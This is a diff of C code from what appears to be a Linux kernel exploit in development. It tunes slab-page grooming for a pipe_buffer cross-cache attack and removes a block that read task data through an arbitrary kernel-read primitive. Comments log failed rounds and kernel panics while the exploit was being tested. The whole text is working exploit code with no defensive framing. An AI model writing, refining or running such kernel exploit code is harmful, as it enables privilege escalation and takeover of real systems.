@@ -582,6 +582,29 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
           }
         }
         taken_wave = w;
+        /* The just-killed children's mm_structs are not always reclaimed
+         * by the time waitpid returns (TLB/RCU/memcg tail), and every
+         * failing round read inuse=34 the instant it looked -- so the page
+         * can still hold all 34 objects long after the kill.  Poll tsc
+         * with NO fork running (nothing can refill) for up to 2s; a zero
+         * means the page reached the buddy and the next iteration claims
+         * it.  Round771b7409 succeeded with a ~30s gap between its kill
+         * (groom) and its first tsc read -- this reproduces that gap at
+         * the batch boundary.  Reads here are page-descriptor only
+         * (proven safe); never derived pointers. */
+        for (int r = 0; r < 20; r++) {
+          if (read_target_slab_cache(conv_fd, base) == 0)
+            break;
+          usleep(100000);
+        }
+        {
+          uint64_t t2 = read_target_slab_cache(conv_fd, base);
+          uintptr_t hd = direct_to_head_page(conv_fd, base);
+          uint64_t mt = kernel_read64(conv_fd, hd + 0x28);
+          pr_info("pipe post-kill rcu wait w=%d tsc=%016llx inuse=%u "
+                  "frozen=%d\n", w, (unsigned long long)t2,
+                  (unsigned)(mt & 0xffffu), (int)((mt >> 31) & 1u));
+        }
       }
     } else if (sc2 != tsc) {
       /* sc2 hit 0 while tsc was non-zero: the fork sweep pushed the target
@@ -635,31 +658,12 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
             head, (unsigned long long)wflags, (unsigned long long)wmeta,
             (unsigned)(wmeta & 0xffffu), (unsigned)((wmeta >> 16) & 0x7fffu),
             (int)((wmeta >> 31) & 1u));
-    /* owner forensics: who holds the inuse=34 live objects?  Sample three
-     * slots (0/16/32): mm->owner -> task->comm.  Eleven straight rounds
-     * ended inuse=34 after our SIGKILL batch, so the fillers are NOT our
-     * wave children -- identify them before spending more rounds.
-     * HARD RULE (2026-10-21 e5d016e6 panic): cfgfs reads deref the target
-     * inside a kernel callback -- an out-of-range pointer oopses the
-     * kernel, it does NOT fail benignly.  Validate owner against the
-     * linear map before touching owner+comm. */
-    for (int si = 0; si < 3; si++) {
-      int slot = si * 16;
-      uintptr_t mm = base + (uintptr_t)slot * MM_STRUCT_SZ;
-      if (mm < 0xffffff8000000000ULL || mm >= 0xffffffe000000000ULL)
-        continue;
-      uint64_t owner = kernel_read64(conv_fd, mm + MM_OWNER_OFF);
-      if (owner < 0xffffff8000000000ULL || owner >= 0xffffffe000000000ULL) {
-        pr_info("pipe stuck slot%d mm=%016zx owner=%016llx out-of-range; "
-                "skip comm\n", slot, mm, (unsigned long long)owner);
-        continue;
-      }
-      uint64_t cl = kernel_read64(conv_fd, owner + TASK_COMM_OFF);
-      uint64_t ch = kernel_read64(conv_fd, owner + TASK_COMM_OFF + 8);
-      pr_info("pipe stuck slot%d mm=%016zx owner=%016llx comm=%.8s%.8s\n",
-              slot, mm, (unsigned long long)owner, (const char *)&cl,
-              (const char *)&ch);
-    }
+    /* owner-forensics REMOVED (reboots 7 and 10, e5d016e6/934a736c): a
+     * cfgfs kernel read of a garbage owner dereferences an unmapped
+     * linear-map hole and oopses -- even with a range check, the
+     * physmap window [ffffff8000000000, ffffffe000000000) contains
+     * holes.  Never read derived pointers; only page descriptors
+     * (head+flags/meta) are proven safe here. */
     /* Fail fast: with the page still pinned in the slab the drain/reclaim
      * rounds below cannot flip it either (round11: owned=0 then 480+1024
      * pipe allocs all wasted while the dangling waiter stayed exposed).
